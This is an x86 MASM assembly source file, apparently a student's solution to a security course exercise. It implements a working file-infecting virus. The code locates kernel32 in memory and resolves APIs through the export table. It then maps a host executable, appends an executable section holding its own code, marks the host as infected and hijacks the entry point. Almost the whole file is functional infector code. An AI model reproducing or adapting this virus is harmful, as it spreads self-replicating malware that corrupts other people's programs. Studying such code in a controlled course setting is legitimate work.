;UID:U202100000:
;Flag:4ee4c9:
;Name:noxke
;Date:2023��12��23��  
;FileName:task7.asm
;Other comments�� 
.586
.model flat,stdcall
option casemap:none
include c:\masm32\include\windows.inc
include c:\masm32\include\comctl32.inc
includelib c:\masm32\lib\comctl32.lib

GetApiA proto:DWORD,:DWORD
.CODE
VirusLen=vEnd-vBegin  	;��������
vBegin:
_Start0:
    ;invoke InitCommonControls
    jmp _Start

K32_api_ordinal_retrieve proc Base:DWORD,sApi:DWORD   ;****��kernel32.dll�в��Һ������****
; ****** Your code 3 begin task6-2******
    ;�����ֳ�
    push ebx
    push ecx
    push edx
    push esi
    push edi
    ;ȡ�������Ĵ�����	
    ;edi=AddressOfNames
    ;ecx=NumberOfNames
    ;edx=AddressOfNameOrdinals
    add edx, dword ptr [Base]
    push edx
    push ecx
    mov edi, esi
    add edi, dword ptr [Base]
    push edi
    ;esi=sApi
    mov esi, dword ptr [sApi]
    xor eax, eax
    xor ebx, ebx
    xor edx, edx
loop1:
    mov edi, dword ptr [esp]
    mov edi, dword ptr [edi+eax*4]
    add edi, dword ptr [Base]
    xor ecx, ecx
loop2:
    mov bl, byte ptr [esi+ecx]
    mov dl, byte ptr [edi+ecx]
    inc ecx
    cmp bl, dl
    jne loop2_end
    test bl, bl
    jz loop1_end
    jmp loop2
loop2_end:
    inc eax
    cmp eax, dword ptr [esp+4]
    jl loop1
    int 3  ;δ�ҵ� ��������
loop1_end:
    pop edi
    pop ecx
    pop edx
    ;׼��ѭ������
    ;�������֣��ҳ�����,����eax
    mov eax, dword ptr [edx+eax*2]
    and eax, 0ffffh
    pop edi
    pop esi
    pop edx
    pop ecx
    pop ebx
; ****** Your code 3 end ******
    ret
K32_api_ordinal_retrieve endp

GetApiA proc Base:DWORD,sApi:DWORD   ;��֪DLL Base ��API�����������Ҹ�DLL�Ķ��API��ַ*****
    local ADDRofFun:DWORD
    ;******  Your code 2 begin task6-1******
    ;�����ֳ�
    push ebx
    push ecx
    push edx
    push esi
    push edi
    ;ָ��ָ��DLL��ַ
    mov ebx, dword ptr [Base]
    ;����PE�ļ�ƫ�ƣ��ҵ���ѡ�ļ�ͷ�ĵ����������ַ
    mov eax, dword ptr [ebx+IMAGE_DOS_HEADER.e_lfanew]  ;PEͷ
    add eax, IMAGE_NT_HEADERS.OptionalHeader    ;OptionalHeaderͷ
    add eax, IMAGE_OPTIONAL_HEADER32.DataDirectory
    mov eax, dword ptr [ebx+eax]    ;������va
    add ebx, eax

    ;ecx=NumberOfNames
    mov ecx, dword ptr [ebx+IMAGE_EXPORT_DIRECTORY.NumberOfNames]
    ;edx=AddressOfNameOrdinals
    mov edx, dword ptr [ebx+IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]
    ;esi=AddressOfNames
    mov esi, dword ptr [ebx+IMAGE_EXPORT_DIRECTORY.AddressOfNames]
    
    invoke K32_api_ordinal_retrieve,Base,sApi	;���sApi�����ordinal������eax
    ;������Ż��Api rva��ַ
    ;edx=AddressOfFunctions
    ;�ҵ�����������ַ���ײ�AddressOfFunctions
    mov edx, dword ptr [ebx+IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]
    add edx, dword ptr [Base]
    mov eax, dword ptr [edx+eax*4]
    ;+ImageBase����api VA��ַ
    add eax, dword ptr [Base]
    ;eax����api��ַ
    ;�ָ��ֳ�
    pop edi
    pop esi
    pop edx
    pop ecx
    pop ebx
    ; ****** Your code 2 end ******
    ret
GetApiA endp

u32 db "User32.dll",0
k32 db "Kernel32.dll",0
appBase dd ?
k32Base dd ?
;********Task 7-1 ��ȡ����API Get More Api and save these address Task 7-1********
lpApiAddrs label near
    dd offset sGetProcAddress
    dd offset sLoadLibrary
    dd offset sGetModuleHandle
    dd offset sCreateFile
    dd offset sCreateFileMapping
    dd offset sMapViewOfFile
    dd offset sUnmapViewOfFile
    dd offset sCloseHandle
    dd offset sGetFileSize
    dd offset sSetEndOfFile
    dd offset sSetFilePointer
    dd offset sExitProcess
    dd 0,0

sGetProcAddress db "GetProcAddress",0
sLoadLibrary db "LoadLibraryA",0
sGetModuleHandle db "GetModuleHandleA",0
sCreateFile db "CreateFileA",0
sCreateFileMapping db "CreateFileMappingA",0
sMapViewOfFile db "MapViewOfFile",0
sUnmapViewOfFile db "UnmapViewOfFile",0
sCloseHandle db "CloseHandle",0
sGetFileSize db "GetFileSize",0
sSetEndOfFile db "SetEndOfFile",0
sSetFilePointer db "SetFilePointer",0
sExitProcess db "ExitProcess",0


aGetProcAddress dd 0
aLoadLibrary dd 0
aGetModuleHandle dd 0
aCreateFile dd 0
aCreateFileMapping dd 0
aMapViewOfFile dd 0
aUnmapViewOfFile dd 0
aCloseHandle dd 0
aGetFileSize dd 0
aSetEndOfFile dd 0
aSetFilePointer dd 0
aExitProcess dd 0
;********Task 7-1 ��ȡ����API end Get More Api and save these address Task 7-1********

;********Task 7-2 ��Ⱦ�����ݽṹ Begin infect host file test.exe and map the file into the memory�� data sturuct********
hostfile db "test.exe",0
fsize dd ?
hFile dd ?
hMap  dd ?
pMem  dd ?
pe_Header dd ?
sec_Header dd ?
sec_Num dd ?
virus_sec_p dd ?    ;���������ļ�ƫ��
virus_sec_size dd ? ;����������С
sec_align dd ?     		;�ڴ��нڶ�������
file_align dd ?			 ;�ļ��нڶ�������
newEip dd ?				;�³�����ڵ��ַ
oldEip dd ?				;ԭ������ڵ��ַ
oldEipTemp dd ?
inc_size dd ?
oldEnd dd ?				;����������Host�ļ��е�д���
;
sMessageBoxA db "MessageBoxA",0
aMessageBoxA dd 0
;Put Your name and UID here
szName db "noxke",0
szUID db "UID U202100000",0dh,0ah,"VirusLen:"
val dd 0,0,0,0
;********Task 7-2 ��Ⱦ�����ݽṹ End infect host file test.exe and map the file into the memory�� data sturuct********

;******�������********

_Start:
    call _delta
_delta:
    pop ebp
    sub ebp,offset _delta
    mov dword ptr[ebp+appBase],ebp
    ; ******* Your code 1 begin task 5******
    ;-----��ȡKerenel32.dllģ���ַ
    mov eax,[esp]    ;from stack
    and eax, 0ffff0000h
    add eax, 10000h
    xor edx,edx
getK32Base:
    sub eax, 10000h
    mov edx,dword ptr[eax+IMAGE_DOS_HEADER.e_lfanew]    ;3ch
    cmp edx,0f8h                                ;check f8
    jnz getK32Base
    cmp eax,dword ptr[eax+edx+IMAGE_NT_HEADERS.OptionalHeader.ImageBase] ;double check ImageBase value with eax
    jnz getK32Base
    mov [ebp+k32Base],eax                ;save ImageBase into k32Base
    ;-----save ImageBase into k32Base
    ; *******   Your code 1 end ******
    lea edi,[ebp+aGetProcAddress]
    lea esi,[ebp+lpApiAddrs]
lop_get:
    lodsd
    cmp eax,0
    jz End_Get
    add eax,ebp
    push eax
    push dword ptr[ebp+k32Base]
    call GetApiA     ;******* Task 7-1 get more api and save the address
    stosd			;eax����ediָ���ַ
    jmp lop_get
End_Get:
    call my_infect 	; ���и�Ⱦ
    
    ;*******Task7-3 Your Code Begin ��Ⱦ����ʾ���볤��VirusLen��������Ϣ*******

    lea eax, [ebp+u32]
    push eax
    call dword ptr [ebp+aLoadLibrary]    ;����User32.dll
    mov [ebp+appBase], eax
    lea eax, [ebp+sMessageBoxA]
    push eax
    mov eax, dword ptr [ebp+appBase]
    push eax
    call [ebp+aGetProcAddress]
    mov [ebp+aMessageBoxA], eax
    ;get VirusLen     ;save VirusLenth into val
    mov eax, VirusLen
    call saveEax
    push 40h+1000h
    lea eax,[ebp+szName]
    push eax
    lea eax,[ebp+szUID]
    push eax
    push 0
    call [ebp+aMessageBoxA]
    ; exit
    ; push 0
    ; call [ebp+aExitProcess]
    ;********Task7-3 Your Code end ��ʾ���볤��VirusLen��������Ϣ*******

    jmp _where

binToAscii proc near	; change al into Ascii
    push eax
    and eax,0fh
    add al,30h
    cmp al,39h
    jbe @f
    add al,7
@@:
    stosb   ;save ax into [edi]
    pop eax
    ret
binToAscii endp

saveEax proc near   ;save eax to val in Ascii mode
    push ecx
    push edi
    push eax
    
    mov ecx,8
    cld
    lea edi,[ebp+val]
L1:	
    rol eax,4
    call binToAscii
    loop L1
    
    pop eax
    pop edi
    pop ecx
    ret
saveEax endp


CouldNotInfect:
_where:
    xor eax,eax
    push eax
    call [ebp+aGetModuleHandle]		;���virus�����������Host������׵�ַ������eax
    mov esi,eax				
    add esi,[esi+3ch]     			;esi->Host PE_Header
    cmp dword ptr[esi+8],'flag'		;�ж����Ѿ������е�Host���򣬻���Virus��������
    je jmp_oep						;******��Host���������Ȩ����Host
    jmp _xit
jmp_oep:
    add eax,[ebp+oldEip]			;******�ҵ�Hostԭʼ��ڵ�ַ����ת
    jmp eax

;*******���и�Ⱦ*******	
my_infect:
    xor eax,eax
    push eax
    push eax
    push OPEN_EXISTING
    push eax
    push eax
    push GENERIC_READ+GENERIC_WRITE
    lea eax,[ebp+hostfile]
    push eax
    call [ebp+aCreateFile]
    inc eax
    je _Err
    dec eax
    mov [ebp+hFile],eax
    push eax
    sub ebx,ebx
    push ebx
    push eax
    call [ebp+aGetFileSize]
    inc eax
    je _sclosefile
    dec eax
    mov [ebp+fsize],eax
    xchg eax,ecx
    add ecx,1000h
    pop eax
    xor ebx,ebx
    push ebx
    push ecx
    push ebx
    push PAGE_READWRITE
    push ebx
    push eax
    call [ebp+aCreateFileMapping]
    test eax,eax
    je _sclosefile				;ʧ����ر��ļ�
    mov [ebp+hMap],eax
    xor ebx,ebx
    push ebx
    push ebx
    push ebx
    push FILE_MAP_WRITE
    push eax
    call [ebp+aMapViewOfFile]
    test eax,eax
    je _sclosefile				;ʧ����ر��ļ�
    mov [ebp+pMem],eax			
    
    ;********Task 7-2 Your Code Being ��ȾHost�ļ�Infect the Host PE file*******
    xchg eax,esi
    ;Check MZ,PE signature
    cmp word ptr [esi], 'ZM'
    jne CouldNotInfect
    add esi,[esi+3ch]   ;ָ��pe_Header
    mov [ebp+pe_Header], esi
    cmp word ptr [esi], 'EP'
    jne CouldNotInfect
    cmp dword ptr [esi+8], 'flag'
    je CouldNotInfect
    ;����flag
    mov ecx, 'flag'
    mov [esi+8], ecx
    ;�õ�data directory����Ŀ
    ;eaxָ��ڱ���ʼ��ַ
    mov eax, dword ptr [esi+14h]    ;SizeOfOptionalHeader
    and eax, 0ffffh
    lea eax, [esi+eax+18h]    ;SectionHeaders
    mov [ebp+sec_Header], eax
    ;ecx�õ�������
    mov ecx, dword ptr [esi+6]  ;NumberOfSections
    and ecx, 0ffffh
    mov [ebp+sec_Num], ecx
    ;�õ����нڱ�Ĵ�С
    ;�ҵ���β��
@@1:
    add eax, 28h
    loop @@1
    ;eax ָ��pe_Header, esiָ�����ڽڱ�ʼƫ�ƴ�
    xchg eax, esi
    ;���ӽ���Ϊ�Լ�������д�����ʵ�ʴ�Сsection name .hum
    mov dword ptr [esi], 'xon.'
    mov dword ptr [esi+4], 'ek'
    ;�ڶ��룬�ļ�����
    mov ecx, dword ptr [eax+38h]    ;SectionAlignment
    mov [ebp+sec_align], ecx
    ;ȡ��һ�ڵ�ַ��ʵ�ʴ�С
    ;�����½ڵ�RVAƫ��λ��
    mov ebx, [esi-18h]  ;SizeOfRawData
    xor ecx, ecx
@@2:
    add ecx, [ebp+sec_align]
    cmp ecx, ebx
    jl @@2
    add ecx, [esi-1ch]  ;rva
    mov [esi+0ch], ecx  ;rva
    ;��������ڵ��ַ������
    mov ebx, [eax+28h]
    mov [ebp+oldEip], ebx
    mov [ebp+newEip], ecx
    mov [eax+28h], ecx  ;EP
    ;���㱾�ڵ��ļ�����
    ;����ڶ����ļ���Ĵ�С
    mov ecx, dword ptr [eax+3ch]    ;FileAlignment
    mov [ebp+file_align], ecx
    mov ebx, VirusLen
    xor ecx, ecx
@@3:
    add ecx, [ebp+file_align]
    cmp ecx, ebx
    jl @@3
    mov [esi+10h], ecx  ;�ļ�����
    mov [ebp+virus_sec_size], ecx
    ;����PointerToRawData
    mov ecx, [esi-14h]  ;PointerToRawData
    add ecx, [esi-18h]  ;SizeOfRawData
    mov [esi+14h], ecx
    mov [ebp+virus_sec_p], ecx
    ;���ý�����0E0000020h
    mov ecx, 0E0000020h
    mov [esi+24h], ecx   ;Characteristics
    ;���½���Ŀ
    mov ecx, [ebp+sec_Num]
    inc ecx
    mov word ptr [eax+6], cx
    ;����ImageSize=ԭImageSize+�������� �������ĳ���
    mov ebx, [ebp+virus_sec_size]
    xor ecx, ecx
@@4:
    add ecx, [ebp+sec_align]
    cmp ecx, ebx
    jl @@4
    add ecx, dword ptr [eax+50h]
    mov [eax+50h], ecx
    ;����������д���½�
    mov ecx, [ebp+virus_sec_size]
    mov edi, [ebp+pMem]
    add edi, [ebp+virus_sec_p]
    lea esi, [ebp+vBegin]
    rep movsb

;*******Task 7-2,Your Code End *******		


;*******��Ⱦ�󣬹ر��ļ�**********	
_sunview:
    push [ebp+pMem]
    call [ebp+aUnmapViewOfFile]
_sclosemap:
    push [ebp+hMap]
    call [ebp+aCloseHandle]
_sclosefile:
    push [ebp+hFile]
    call [ebp+aCloseHandle]
_Err:
    ret
_xit:
    push 0
    call [ebp+aExitProcess]      ;******�����˳�ExitProcess******
vEnd:
    end _Start0
